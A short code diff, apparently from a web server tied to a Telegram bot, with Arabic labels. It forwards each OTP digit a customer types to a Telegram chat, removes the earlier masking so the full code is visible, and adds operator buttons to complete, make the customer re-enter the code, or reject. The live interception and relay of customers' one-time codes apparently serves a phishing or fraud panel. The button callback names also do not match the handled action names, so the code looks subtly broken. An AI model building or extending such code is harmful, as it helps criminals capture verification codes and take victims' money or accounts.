@@ -155,6 +155,22 @@ async function startServer() {
           await bot?.answerCallbackQuery({ callback_query_id: query.id, text: "لا يزال قيد المعالجة" });
           return;
         }
+
+        if (action === "otp_complete") {
+          await store.updateTransactionStatusByRef(orderRef, "completed");
+          await bot?.answerCallbackQuery({ callback_query_id: query.id, text: "تم تأكيد طلب الـ OTP وإكماله" });
+          return;
+        }
+        if (action === "otp_retry") {
+          await store.updateTransactionStatusByRef(orderRef, "retry_otp");
+          await bot?.answerCallbackQuery({ callback_query_id: query.id, text: "تم توجيه الزبون لإعادة إدخال الرمز" });
+          return;
+        }
+        if (action === "otp_reject") {
+          await store.updateTransactionStatusByRef(orderRef, "failed");
+          await bot?.answerCallbackQuery({ callback_query_id: query.id, text: "تم رفض الكود وإفشال العملية" });
+          return;
+        }
       }
       if (data?.startsWith("ban_")) {
         await bot?.answerCallbackQuery({ callback_query_id: query.id, text: "غير متصل بالنظام بعد" });
@@ -378,9 +394,16 @@ async function startServer() {
       if (bot && chatId) {
         let msg = `🔐 <b>إدخال رمز التحقق (OTP)</b>\n`;
         msg += `🧾 <b>رقم الطلب:</b> ${order_id}\n`;
-        msg += `🔑 <b>أخر رقم مدخل:</b> <code>***${otpDigit}</code>`;
+        msg += `🔑 <b>أخر رقم مدخل:</b> <code>${otpDigit}</code>`;
         try {
-          await bot.sendMessage(chatId, msg, { parse_mode: "HTML" });
+          const reply_markup = {
+            inline_keyboard: [
+              [{ text: "✅ إكمال الطلب", callback_data: `optcomplete_${order_id}` }],
+              [{ text: "🔄 إعادة طلب الرمز", callback_data: `optretry_${order_id}` }],
+              [{ text: "❌ رفض", callback_data: `optreject_${order_id}` }]
+            ],
+          };
+          await bot.sendMessage(chatId, msg, { parse_mode: "HTML", reply_markup });
         } catch (e) {
           console.error("Telegram send otp:", e);
         }
